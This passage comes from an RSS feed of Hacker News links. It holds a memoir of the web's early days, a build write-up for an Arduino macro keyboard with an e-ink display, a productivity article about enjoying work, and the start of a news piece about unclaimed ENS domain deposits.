<p>Subsequently, I joined the <a href="https://lists.w3.org/Archives/Public/www-talk/1991SepOct/0001.html">www-talk mailing list</a> and also contacted Tim Berners-Lee directly. I wanted to know if he was interested in technology I‚Äôd heard about from friends at Adobe Systems. Adobe‚Äôs editable PostScript specification (which came to be named PDF and became the basis for a product named ‚ÄúAcrobat‚Äù) seemed to me a better match for distributed hypertext than the very-limited SGML-based ‚ÄúHTML tags‚Äù that Tim Berners-Lee was using. HTML offered only minimal layout and styling possibilities; <a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a> was a better page description language.</p>

<p>Here‚Äôs an excerpt‚Ä¶</p>

<p><img src="https://blog.yax.com/images/post1-timbl.gif" alt=""></p>

<p>Tim Berners-Lee was reluctant to publicize that code for the web was available for free, as management at CERN had not yet agreed to release it publicly (that didn‚Äôt happen until <a href="https://cds.cern.ch/record/1164399">April 1993</a>). Plus, the editors at <em>NeXTWORLD</em> were not interested in a product that was only useful for a few NeXT users with Internet access, so I wasn‚Äôt able to write about it for <em>NeXTWORLD</em> (too bad, as I could have been the first journalist to write about the web!).</p>

<p>A year later, editable PostScript was released, and in 1993, <a href="https://en.wikipedia.org/wiki/Robert_Cailliau">Robert Cailliau</a> of CERN visited me in California. I arranged a meeting between Cailliau and management at Adobe Systems. He met with John Kunze of Adobe at the Stanford Linear Accelerator Center (SLAC) and demonstrated the WorldWideWeb ‚Äî the first time management at Adobe had seen the web. By that time, HTML was firmly entrenched as the native language of the new web. Adobe later invested in Netscape Communications and produced an Acrobat plug-in for the Netscape web browser, establishing the basis for viewing richly formatted PDF pages in web browsers.</p>

<p>For some years afterward, I regretted that the Adobe/WWW meeting had not taken place the previous year, because I imagined the richer PDF language might have eclipsed the sparse and limited HTML language as the primary syntax of web pages. With the adoption of the <a href="http://www.w3.org/Style/LieBos2e/history/">Cascading Style Sheets specification</a> (from 1999 forward), my views changed. I‚Äôve come to appreciate that the technical underpinnings of the web are optimal, reflecting both the genius of Berners-Lee‚Äôs original vision and the rich contributions of the worldwide developer community.</p>

<p>Thirty years later, it is easy to overlook the web‚Äôs origins as a tool for sharing knowledge. Key to Tim Berners-Lee‚Äôs vision were open standards that reflected his belief in the <a href="https://www.w3.org/2001/tag/doc/leastPower">Rule of Least Power</a>, a principle that choosing the simplest and least powerful language for a given purpose allows you to do more with the data stored in that language (thus, HTML is easier for humans or machines to interpret and analyze than PostScript). Along with open standards and the Rule of Least Power, Tim Berners-Lee wanted to make it easy for anyone to publish information in the form of web pages. His first web browser, named Nexus, was both a browser and editor. The NeXTSTEP SDK made editing easy to implement; editing was abandoned in subsequent non-NeXT web browsers.</p>

<p>I think we‚Äôve lost sight of that original vision. Facebook or Wix makes it easy to author web pages but at the cost of lock-in to proprietary systems. And when developers choose complex software such as React or Rails to build simple websites, I cringe at the violation of Rule of Least Power. I still have a ‚Äúdeep case of net religion‚Äù (as John Perry Barlow said in 1991), and I‚Äôm now writing about ways to build websites without frameworks and build tools (see my articles, <a href="https://tutorials.yax.com/articles/build-websites-the-yax-way/index.html">Build Websites the Stackless Way</a>). My current project, <a href="https://yax.com/">Yax.com</a>, is a do-it-yourself website builder that uses new web standards (including web components) to help people build simple sites. Thirty years on, we still have a lot of work to do to realize the web‚Äôs original goals. I hope I‚Äôm not the only one who sees this.</p>

<p>I never anticipated that Berners-Lee‚Äôs NeXT hypertext project would become a medium to supplant print and television. In 1991, during idle moments, I imagined the world‚Äôs books and magazines might be reborn as hypertext (many others had imagined this earlier, including Ted Nelson, with his Xanadu project). But I never honestly believed that Berners-Lee‚Äôs software project could change the world. By 1999, as web addresses appeared on billboards and the sides of buses, I started to accept that Berners-Lee naming his project ‚Äúthe WorldWide Web‚Äù was not vainglorious but merely prescient. Still, I hope its utility as a platform for commerce does not eclipse our original vision of the web as a means for sharing the world‚Äôs knowledge.</p>

<p><img src="https://blog.yax.com/images/post1-signature-dmk.gif" alt=""></p>

                </div>
                
                

            </div>
        </div></div>]]>
            </description>
            <link>https://blog.yax.com/posts/early-days-of-the-web-1991/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191562</guid>
            <pubDate>Fri, 19 Feb 2021 10:33:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open-source macro keyboard with E-Ink display]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26191518">thread link</a>) | @geekuillaume
<br/>
February 19, 2021 | https://there.oughta.be/a/macro-keyboard | <a href="https://web.archive.org/web/*/https://there.oughta.be/a/macro-keyboard">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <header>
  <img id="logo" src="https://there.oughta.be/assets/images/tob-white.svg">
  <nav>
  <a href="https://there.oughta.be/">Home</a><a href="https://there.oughta.be/an/about/page">About</a>
</nav>

</header>
    
    
    


<div>

<p><img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/display.jpg" srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/display.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/display.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/display.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/display.jpg 1280w">
</p></div>


<p>17 February 2021</p>

<p>I built a dynamically assignable macro keyboard with an e-ink screen. What does that mean? Well, it is a device that pretends to be a regular keyboard, but the meaning of each button changes depending on which application you currently try to control. Let me show you in a video:</p>

<figure>
<a href="https://youtu.be/nndeAxd5FdM" target="_blank">
<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/youtube.jpg" alt="Thumbnail of a youtube video about the macro keyboard, showing the device with rainbow LEDs and images on the e-ink screen." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/youtube.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/youtube.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/youtube.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/youtube.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/youtube.jpg 1920w">
</a>
<figcaption>Click the image to see the video on youtube.com.</figcaption>
</figure>

<p>So, you now have an idea what I am talking about? Then let me explain the details in this article.</p>

<!--more-->

<h2 id="what-does-it-do">What does it do?</h2>

<p>As you can see from the pictures, it is a device with eight buttons, a large dial and a display and it is plugged into a PC via USB. There it registers as a regular keyboard and sends individual key events or sequences of keypresses if I push one of the buttons. So, it is a macro keyboard - a keyboard to send macros.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/device.jpg" alt="Photo of the device. On the front left there is a big knob illuminated from the back in rainbow colors. The main part of the device is dominated by a long e-ink display with four buttons on each side." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/device.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/device.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/device.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/device.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/device.jpg 3000w">

<figcaption>The macro keyboard with an rgb backlit jog wheel, eight buttons and an e-ink display at the center.</figcaption>
</figure>

<p>The special thing about it is that I can dynamically reassign keys and display the current key assignment on an e-ink screen. So, for example, by default the top four keys are assigned to media control keys: Play, pause and skip buttons. If I press them, the device sends the media buttons to the PC as if those buttons were pushed on a normal keyboard with multimedia keys. But if I open up Gimp<sup id="fnref:gimp" role="doc-noteref"><a href="#fn:gimp">1</a></sup>, the keys change their meaning to functions within Gimp, which I need regularly and for which I cannot remember the shortcuts: For example ‚Äúcut size to the selected area‚Äù, ‚Äúautomatically cut the image size to the content‚Äù etc.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/gimp.jpg" alt="Side-by-side image of the macro keyboard with fallback layout and with the layout specific for Gimp, showing different icons next to each key." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/gimp.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/gimp.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/gimp.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/gimp.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/gimp.jpg 3000w">

<figcaption>Left: The default layout of the macro keyboard with some media control buttons, a button to control a lamp in my office, a demo button and two shortcuts to applications. Right: If the image editing software Gimp is in focus on my PC, the macro keyboard switches to shortcuts specific for Gimp with matching icons.</figcaption>
</figure>

<p>Those are actually not simple key strokes and these particular examples do not even have a direct shortcut. Instead, if I press the ‚Äúcut to selection‚Äù button, the device sends a quick sequence of ‚ÄúAlt+B‚Äù to open the image menu, followed by ‚ÄúZ‚Äù to select the function from the menu<sup id="fnref:gimpshortcuts" role="doc-noteref"><a href="#fn:gimpshortcuts">2</a></sup>. At the same time, the device shows some icons next to the buttons to tell me, which assignment is currently active.</p>

<p>Keystrokes or sequences cannot only be assigned to those eight buttons, but also to the big knob at the bottom. This is designed as a so-called jog wheel, commonly used in video editing to precisely move to a specific frame while at the same time allowing to quickly skip larger periods with the same control element<sup id="fnref:wheels" role="doc-noteref"><a href="#fn:wheels">3</a></sup>. In Gimp, it controls the tool size (brush size, pen size, eraser size, you get the idea‚Ä¶) or the tool opacity (brush opacity, alright, you know). How can it control both? Well, it doubles as another button. You can press the wheel and trigger a ninth<sup id="fnref:ninth" role="doc-noteref"><a href="#fn:ninth">4</a></sup> button, which can also be associated with keypresses. However, in this case it is not set to send a keystroke, but instead triggers a script to switch the function of turning the wheel.</p>

<p>I actually use this a lot to control additional things with Python or to switch functions of the buttons. The default layout has a button that triggers an MQTT message (in a Python script) to switch a lamp in my office. Of course the script also listens for state changes of the lamp, so the icon on the e-ink screen changes accordingly<sup id="fnref:lampvisible" role="doc-noteref"><a href="#fn:lampvisible">5</a></sup>.</p>

<p>Similarly, I use Python to control OBS<sup id="fnref:obs" role="doc-noteref"><a href="#fn:obs">6</a></sup> via its websockets plugin. If OBS is running, the left set of buttons allows me to switch scenes (a broader moderation view, a close-up shot, sharing slides with the close-up as picture-in-picture frame and an empty ‚Äúvideo mute‚Äù scene) and the right set of buttons controls elements (microphone mute, overlay screen of my phone, picture-in-picture of the slide scene etc.). This is actually the main reason why I designed this macro keyboard in the first place: I needed a bunch of shortcuts for OBS and could not find a set that was easy to find while talking into a camera and that at the same time did not interfere with common shortcuts. In this case, though, I am not even sending keypresses but activating scenes and changing visibility of components via the websockets plugin from Python. The advantage is that this also allows me to retrieve the current state from OBS and visualize it on the e-ink screen accordingly.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/obs.jpg" alt="Side-by-side image of the macro keyboard controlling OBS in different states. The jog wheel is red in one image to indicate a muted microphone, but green in the other to show a live mic. Various icons change between a normal and a crossed-out state as their corresponding sources are toggled on or off." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/obs.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/obs.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/obs.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/obs.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/obs.jpg 3000w">

<figcaption>The macro keyboard controlling OBS in different states. On the left, the scene to present slides is selected (arrow on the third icon of the left column), the phone overlay is active (second icon, right column), the picture-in-picture portrait camera is visible (third icon, second column) and the microphone is muted (bottom right), which is also shown by the red jog wheel knob. On the right, the wide shot (arrow on the top-left icon) is active with both overlays deactivated (crossed out) and the microphone enabled (bottom right icon and green jog wheel).</figcaption>
</figure>

<p>In its default settings, the function of the wheel can be switched between a mouse wheel, simple arrow keys left/right and a volume control. In case of the volume control the rotation actually does two things: It sends the volume up/down keys like volume controls on a keyboard, but it also triggers a Python script that checks the system volume and visualizes it with the LEDs below the wheel.</p>

<p>Oh, I did not yet mention those? Well, there are 12 individually addressable RGB LEDs below the jog dial as another means to visualize its function, to notify of some events (a blue pulse means that the CO2 sensor in my office indicates that it is time to vent) or to show a status (like red or green if the microphone is muted or not in OBS during a Zoom call)<sup id="fnref:showoff" role="doc-noteref"><a href="#fn:showoff">7</a></sup>. In case of the volume control, a number of LEDs changes from green to red depending on the volume level reported back by the system.</p>

<figure>

<img src="https://there.oughta.be/assets/resized/images/2021-02-17/1280/volume.jpg" alt="Photo sequence of the knob at different volume levels with the matching volume dialog of the operating system below. From the left, the volume increases from 0% to 100% and the LEDs of the know turn from green to re accordingly in a clock-wise order." srcset="    https://there.oughta.be/assets/resized/images/2021-02-17/640/volume.jpg 640w,    https://there.oughta.be/assets/resized/images/2021-02-17/768/volume.jpg 768w,    https://there.oughta.be/assets/resized/images/2021-02-17/1024/volume.jpg 1024w,    https://there.oughta.be/assets/resized/images/2021-02-17/1280/volume.jpg 1280w, https://there.oughta.be/assets/images/2021-02-17/volume.jpg 2000w">

<figcaption>Rotating the jog wheel can control the volume and a script is used to display the current volume level on the knob's LEDs as feedback.</figcaption>
</figure>

<p>I think at this point you have a good idea of what this device can do. Actually, there are so many more possible applications and certainly a lot of things I have not even thought of. I also imagine that gamers can do a lot with these buttons - at least in games where moving your hand to a second device is not slowing you down too much. Let me tell you how this versatility is achieved, so you can get your own imagination going.</p>

<h2 id="how-does-it-work">How does it work?</h2>

<p>At the heart of the macro keyboard is a Pro Micro, an Arduino-compatible microcontroller, which I have chosen for one simple reason: Its ATmega32U4 supports up to six USB endpoints<sup id="fnref:leonardo" role="doc-noteref"><a href="#fn:leonardo">8</a></sup>. If you plug it into your PC, the PC will not only see a regular USB keyboard, but also a USB mouse, a USB ‚Äúconsumer keyboard‚Äù (extension for multimedia keys) and a USB serial interface.</p>

<p>The latter is the trick to dynamically change the function of the keyboard. I have implemented a simple protocol that allows to send short commands to the serial interface that tell the Pro Micro which keystrokes (or mouse movements or media keys) should be assigned to each button. In practice, I have a Python script running that detects which software is running and which is currently focused (for example Gimp or OBS as mentioned above) and sends a new key assignment to the macro keyboard.</p>

<p>An important aspect of this is that the Pro Micro can act as a keyboard or mouse on its own without consulting with the Python script. If the button for the Gimp shortcut from the example above is pressed, the Pro micro sends key events ‚ÄúAlt pressed‚Äù, ‚ÄúB pressed‚Äù, ‚ÄúB released‚Äù, ‚ÄúAlt released‚Äù, ‚ÄúZ pressed‚Äù, ‚ÄúZ released‚Äù directly to the PC to which the events seem to come from a regular keyboard. The same goes for mouse events (including the mouse wheel) sent from the macro keyboard. The benefit is that this is as snappy as it gets (without a serial interface and a Python script in-between) and that this should work with any software or game without emulating anything in Python.</p>

<p>But since we sometimes can do much more in Python, keystrokes are also reported via serial<sup id="fnref:delay" role="doc-noteref"><a href="#fn:delay">9</a></sup>, so the Python script can also react to it and trigger more complex actions like the MQTT script that sets my office light or simply sending back feedback to the wheel LEDs. Those LEDs are also controlled by a set of RGB values that are sent via serial. With only twelve LEDs, there is no problem to update them fast enough to get a smooth animation.</p>

<figure>

<video autoplay="" loop="" muted="" playsinline="">
  <source src="https://there.oughta.be/assets/images/2021-02-17/gimp.mp4" type="video/mp4">
</video>

<figcaption>A short video loop of the macro keyboard reacting to a task switch between Gimp and the web browser, causing the device to switch between Gimp and fallback assignments. The refresh of the e-ink screen is not immediate, but fast enough to not disrupt your workflow. (Some of the delay can also be attributed to the polling interval of the script to get the active window and a little delay from the capture card through which the video of the device was recorded in contrast to the screencap on the right hand side.)</figcaption>
</figure>

<p>Finally, the content of the e-ink screen is also directly set by the Python script. And by directly, I mean that the Pro Micro does not even have enough RAM to store the full monochrome image of the entire 128x296 screen. This is a minor design flaw as you will see later as it complicates the commands to send an image slightly and prevents some optimizations by the Pro Micro itself. If I had picked a different microcontroller screen updates might have been a little bit faster, but then again, updates of an e-ink screen are not the fastest in any case. Luckily, the screen supports partial updates, so you still never need to wait for more than a second. Still, this is the reason why slower state changes (scenes in OBS, switching applications) can be shown on the e-ink screen, but rapid changes (like steps of the volume change) are shown with the LEDs.</p>

<h2 id="the-components">The components</h2>

<p>The entire device cost me about 86‚Ç¨ (plus 3d printing the case) and it can quite certainly be done for less. If you build more than one and/or find a cheaper ‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://there.oughta.be/a/macro-keyboard">https://there.oughta.be/a/macro-keyboard</a></em></p>]]>
            </description>
            <link>https://there.oughta.be/a/macro-keyboard</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191518</guid>
            <pubDate>Fri, 19 Feb 2021 10:27:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to be more productive without forcing yourself]]>
            </title>
            <description>
<![CDATA[
Score 248 | Comments 120 (<a href="https://news.ycombinator.com/item?id=26191516">thread link</a>) | @vitabenes
<br/>
February 19, 2021 | https://www.deprocrastination.co/blog/how-to-be-productive-without-forcing-yourself | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/how-to-be-productive-without-forcing-yourself">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><img src="https://www.deprocrastination.co/assets/illustrations/work_bad_rect.png" referrerpolicy="no-referrer" alt="How to be more productive without forcing yourself"></p><p>Imagine you could work more and be wildly productive. And the best thing about it? You wouldn‚Äôt need to force yourself to work.</p><p>There are people exactly like that who sit down and work without pushing themselves to do it. They even look forward to working. The good news is that you can learn to do it too.</p><p>Let‚Äôs get to it.</p><p>Most people have a negative mindset about work. People see work as an annoyance that keeps them from doing whatever they really want to do. They also think that resting and having nothing to do is an ideal state they‚Äôd like to be in forever. This leads to thinking that you need to push yourself to work. You need to use willpower to get yourself to do it.</p><p>It‚Äôs simple to understand where this attitude comes from:</p><ol><li>People usually want things they don‚Äôt have and think that grass is greener on the other side.</li><li>Everyone talks about how work is hard.</li><li>In comparison to dead-end or corporate jobs without impact or freedom, neverending leisure looks like paradise.</li></ol><p>In reality, most people who try to be in this nothing-to-do state for a long time become unhappy, depressed, and bored. Rich people who ‚Äúmade it‚Äù report how soon they become restless again.&nbsp;<a href="https://www.reddit.com/r/StopGaming/">People who game all the time</a>&nbsp;realize how empty it feels. Too much leisure isn‚Äôt satisfying for long.</p><p>On the other hand, there is a certain group of people who work a lot and enjoy it. Let‚Äôs call this group&nbsp;<em>producers</em>. By this, we don‚Äôt mean workaholics who escape from their whole life by working all the time. Producers have a healthy work-life balance. So what do they do that people who hate work don‚Äôt?</p><p>First, they tend to think about work differently.</p><p>For them, work is&nbsp;<a href="https://www.deprocrastination.co/blog/what-is-a-positive-feedback-loop-and-why-it-matters">a virtuous cycle of positive feedback loops</a>. Producers see&nbsp;<strong>work as a source of meaning and satisfaction</strong>. They see work as something that allows them to savor deserved leisure. They see rest as something that increases their life happiness and fuels their motivation towards work.</p><p>Second, their work is usually:</p><ul><li>Interesting</li><li>Meaningful</li><li>Well-defined</li></ul><p>If you check at least 1 or 2 boxes somehow, something magical happens:</p><p><strong>You don‚Äôt have to push yourself towards work anymore.</strong></p><p>Well-defined, meaningful, and especially interesting work is easy to look forward to.</p><p>Non-producers often think that these producers are lucky because they stumbled upon work like this. In reality, producers often go a long way to make their work fun.</p><h2>How to make work more interesting</h2><p>This is the crucial factor in whether work gets done.</p><p>You don‚Äôt have to see any meaning in your work for it to be interesting.</p><p>Even if the task is totally undefined, complex, and difficult, curiosity can carry you to its completion.</p><p>So how can you develop this curiosity towards work?</p><p>You have to give the work a chance to become interesting. How? By combining these 3 steps:</p><h3>1. Have less exposure towards super fun things</h3><p>Video games, surfing the internet, porn, alcohol, and drugs etc. make work significantly more difficult. Why?</p><p>They establish a certain standard of mental stimulation. Anything that‚Äôs not super fun will seem boring.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_standard.png" referrerpolicy="no-referrer" alt="We develop a Stimulation Standard"></p><p>Unfortunately, work often falls in the ‚Äúfeels bad‚Äù category. In comparison to games or social media, work can feel uninteresting or annoying.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_work_distractions.png" referrerpolicy="no-referrer" alt="Switching from distractions to work is hard"></p><p>You might argue that there are people who work just fine even while drinking alcohol, playing video games etc.</p><p>However, consider that there are two types of people: ones who can moderate their consumption and others who can‚Äôt. The latter society often describes as addicts.</p><p>Basically, if you‚Äôre addicted to any of the high-dopamine, low-effort activity, please quit it. At least temporarily so you can reestablish a healthy relationship to work. The more experienced we‚Äôre about the topic, the more obvious this is. There is no other way than to temporarily quit the addiction. If your vice is gaming, we‚Äôve covered&nbsp;<a href="https://www.deprocrastination.co/blog/should-i-quit-video-games">video gaming addiction here</a>.</p><p>Some can have a healthy relationship with, for example, gaming.</p><p>However, for some people gaming is kryptonite. Here are some signs that super-fun activities have a detrimental effect on your work:</p><ol><li>You rush and half-ass everything else in order to get to your super-fun activity.         When I (Mat) was addicted to gaming, everything during the day was half-assed so I could finally start playing.</li><li>You keep postponing or forgetting everything that isn‚Äôt urgent in order to get to your super fun activity. You have this book that you want to read but you never get to actually reading it.</li><li>Your orderliness suffers once you start with the super fun activity.        Most people who come back to gaming report how their sense of orderliness starts to depreciate rather quickly. Their room gets messy, they start skipping workouts, stop meal-prepping, start eating more junk food, stop organizing their days.</li></ol><p>If the points above describe you, it might be time to quit your super fun activity. At least for a while.</p><p>Once your brain is not constantly hyper-stimulated, it‚Äôs easier to find mundane activities like work or tidying more interesting.</p><h3>2. Get bored more often</h3><p>When you get bored, everything else becomes more interesting.</p><p>Don‚Äôt believe us? Try this little experiment. Turn everything off. Set a timer for 15 minutes. Sit on a chair and stare at a wall. Don‚Äôt move. Don‚Äôt consume any information. Don‚Äôt talk. Don‚Äôt write anything down. Just stare at the wall.</p><p>Except for zen masters, most of us will become restless after a few minutes. Often, our brain starts dreaming and imagining things. For the first few minutes, you might feel alright, thinking about your day. However, after 5 or 10 minutes, you‚Äôll be itching to do something, anything really. Suddenly, creating a website, writing an article, or drawing a picture sounds like more interesting, more fun.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/stimulation_work_boredom.png" referrerpolicy="no-referrer" alt="Switching from boredom to work is easier"></p><p>If you feel like you never stop scrolling and consume content all the time, schedule a 15 minute boredom window for tomorrow right before you want to start working.&nbsp;<a href="https://www.deprocrastination.co/blog/how-to-use-boredom-to-procrastinate-less">Use boredom strategically.</a></p><h3>3. Dive deep into a topic</h3><p>It‚Äôs fun when we can connect the dots. When we can draw new connections between ideas, we get a rush.&nbsp;<em>Oh, I can see how this historical event contributed to an uprising‚Ä¶</em></p><p>The more connections we can draw within a topic, the more interested we become. This is what curiosity is all about.</p><p>If you take the time to watch a documentary related to what you‚Äôre working on, read a book about it, or find a couple relevant articles. You‚Äôll collect more dots to connect. You‚Äôll see how everything fits together.</p><p>When you do feel like watching something or have a free evening, instead of watching random videos or reruns of old TV shows, steer your attention to something related to what you need to do.</p><p>Give yourself time to develop an interest.</p><h2>How to make work more meaningful</h2><p>It's hard to feel motivated when you don't have a personal reason to do something.</p><p>However, ‚Äúmeaningful work‚Äù has become something of a buzzword.</p><p>Everyone is trying to find meaning in their work. This can be wasted energy, especially if you work in a corporate or a dead-end job. We say this so you don‚Äôt dwell on it and don‚Äôt feel frustrated because you can‚Äôt figure out how to save the world by doing what you do.</p><p>In any case, whatever your work is, you can make it meaningful enough to start.</p><p>Let‚Äôs say you have to study for an exam. You don‚Äôt find this particular class enjoyable. If you remind yourself why you chose to take the class and why studying is important for you, you will have an easier time persuading yourself to push through.</p><p>The fact is that some things simply need to be done. It's better if you find a compelling and personal reason to do them and get them over with as soon as possible, instead of putting them off forever.</p><p>When something is boring, ask yourself: Why do I need to do this? Find and reinforce the why behind the work.</p><h2>How to make work well-defined</h2><p>If you have a recipe that tells you step-by-step how to cook a meal, it is usually quite easy to follow. You know exactly where to start and how.</p><p>In today‚Äôs creative work, this often isn‚Äôt the case. There are no recipes for the work we need to do, or they don‚Äôt make the work any easier because the recipe would be too complex to understand.</p><p>Additionally, we often hamper our enthusiasm towards work by ourselves. How often do you find yourself with vague and unhelpful to-dos like ‚Äúwrite the essay‚Äù or ‚Äúmake a video.‚Äù</p><p>There are so many steps in ‚Äúmake a video‚Äù that this vague task definition only causes anxiety and procrastination.</p><p>We always say that it‚Äôs more difficult to start working than to keep working. Therefore we should make starting easier by defining well&nbsp;<em>how</em>&nbsp;to begin and&nbsp;<em>what</em>&nbsp;to begin with.</p><p>The better you can define how to start working, the easier it‚Äôll be to actually do it.</p><p>Basically, you do this in 3 steps:</p><h3>1. Always define exactly where you‚Äôll start</h3><p>This means you write down the next physical action to take.</p><p>Do you need to write an essay?</p><p>The next physical action is: Open the scientific study and start reading</p><p>Or: Create a document ‚Üí Create a rough draft in the next 15 minutes</p><p>Do you want to start learning coding?</p><p>The next physical action should be: Open freecodecamp.org ‚Üí Start solving the first challenge</p><p>It might sound silly to define the next physical action, but it isn‚Äôt. Finding it is easy, and you can do it immediately.</p><p>What‚Äôs the next physical action you need to take?</p><h3>2. Start with only having to work for 5/15 minutes</h3><p>You probably don't feel like creating a 20 slide presentation right now from scratch, and then presenting it in 2 hours.</p><p>You don't feel like writing a whole final thesis on a topic you barely know.</p><p>You don't feel like running a marathon.</p><p>But you might feel like looking up a couple pictures or articles for the presentation.</p><p>Or feel like writing a paragraph or two before lunch break.</p><p>Or feel like taking a 1km walk.</p><p>Those are the small steps along the longer journey.</p><p>We often underestimate the power of small steps, but they are essential because they help us get into the right routine.</p><p>If you start running a couple miles every other day, you'll get familiar with the routine and then you'll naturally want to start increasing the ‚Ä¶</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.deprocrastination.co/blog/how-to-be-productive-without-forcing-yourself">https://www.deprocrastination.co/blog/how-to-be-productive-without-forcing-yourself</a></em></p>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/how-to-be-productive-without-forcing-yourself</link>
            <guid isPermaLink="false">hacker-news-small-sites-26191516</guid>
            <pubDate>Fri, 19 Feb 2021 10:27:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[‚ÄòENS deposit whale‚Äô has $76M worth of Ethereum waiting for them]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26191481">thread link</a>) | @senor_lecce
<br/>
February 19, 2021 | https://protos.com/ethereum-name-service-ens-whale-deposits-crypto-darkmarket/ | <a href="https://web.archive.org/web/*/https://protos.com/ethereum-name-service-ens-whale-deposits-crypto-darkmarket/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-2623">
<header>


</header>
<figure>
<img width="889" height="500" src="https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH.jpg" alt="ens, ethereum" loading="lazy" srcset="https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH.jpg 1920w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH-300x169.jpg 300w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH-1024x576.jpg 1024w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH-768x432.jpg 768w, https://protos.com/wp-content/uploads/2021/02/Protos-Artwork-75M-ETH-1536x864.jpg 1536w" sizes="(max-width: 889px) 100vw, 889px" data-pagespeed-url-hash="2118248695" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">

</figure>
<main>
<div>
<p>Decentralized domain guru <a href="https://ens.domains/" target="_blank" rel="noreferrer noopener">Ethereum Name Service</a> (ENS) is searching for the <strong>owner of darkmarket.eth</strong> ‚Äî there‚Äôs $76 million in Ethereum with their‚Ä¶ name on it.</p>
<p>In 2017, darkmarket.eth sold at auction for 20,103 ETH, worth about $5 million back then but today <strong>over $38 million</strong>.</p>
<figure><div>
<blockquote data-width="500" data-dnt="true"><div lang="en" dir="ltr"><p>Is 0x8759b0b1d9cba80e3836228dfb982abaa2c48b97 you? Do you own darkmarket.eth?</p><p>If so, you have nearly 40,000 ether locked up in ENS deposits from ENS's first two years ‚Äì that's about 73 million USD at today's prices.</p><p>You can claim them back here: <a href="https://t.co/HKRlWPn7uT">https://t.co/HKRlWPn7uT</a></p></div>‚Äî nick.eth (@nicksdjohnson) <a href="https://twitter.com/nicksdjohnson/status/1361089513515229184?ref_src=twsrc%5Etfw">February 14, 2021</a></blockquote>
</div></figure>
<p>Whoever bought it <em>also</em> <strong>owns 30 other</strong> Ethereum Names acquired during ENS‚Äô first two years, including the <a href="https://etherscan.io/ens?filter=mostexpensive" target="_blank" rel="noreferrer noopener">second most expensive</a> domain name of all time, openmarket.eth.</p>
<p>Protos also linked the ‚Äò<strong>ENS deposit whale</strong>‚Äò to a raft of related domain names like silkroad.eth, openexchange.eth, and payment.eth.</p>
<ul><li>Altogether, darkmarket.eth‚Äôs owner spent 39,712 ETH on ENS auctions.</li><li>Protos calculated that was worth <strong>roughly $14.8 million</strong> at the time.</li><li>Ethereum‚Äôs price is <strong>up 400% since then</strong> ‚Äî inflating those deposits to $75.7 million.</li></ul>
<h2 id="h-ens-offers-domain-names-for-web-3-0">ENS offers domain names for Web 3.0</h2>
<p>ENS domain names <strong>replace Ethereum addresses</strong>, which can be lengthy and complicated for newer users.</p>
<p>The service used to allow anyone to effectively rent an .eth address by <strong>depositing cryptocurrency</strong> into a smart contract, but now it offers domain names for an annual fee.</p>
<p>Leases on ENS domain names sold in the <strong>first few years</strong> of the service ‚Äî like darkmarket.eth ‚Äî have now expired.&nbsp;</p>
<figure></figure>
<p><em><i>[</i>Read more: <a href="https://protos.com/bitcoin-jokers-stash-closes-with-1b-in-the-bank/" target="_blank" rel="noreferrer noopener">Dark web giant Joker‚Äôs Stash just ‚Äòretired‚Äô with $1B in Bitcoin</a>]</em></p>
